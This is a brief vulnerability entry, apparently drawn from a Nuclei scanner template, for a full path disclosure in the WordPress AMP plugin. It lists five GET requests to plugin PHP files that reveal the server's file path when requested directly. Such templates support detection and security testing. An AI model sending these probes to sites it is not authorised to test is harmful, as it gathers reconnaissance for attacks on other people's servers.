# Vulnerability: WordPress AMP - Full Path Disclosure
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wordpress-amp-fpd.yaml`)

## Description
The WordPress AMP - Accelerated Mobile Pages plugin was detected to be vulnerable to Full Path Disclosure, allowing unauthenticated access to the full application path.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/accelerated-mobile-pages/includes/options/redux-core/framework.php
GET {{BaseURL}}/wp-content/plugins/accelerated-mobile-pages/includes/options/admin-config.php
GET {{BaseURL}}/wp-content/plugins/accelerated-mobile-pages/includes/thirdparty-compatibility.php
GET {{BaseURL}}/wp-content/plugins/accelerated-mobile-pages/templates/starter-flavor.php
GET {{BaseURL}}/wp-content/plugins/accelerated-mobile-pages/classes/class-flavor.php
```

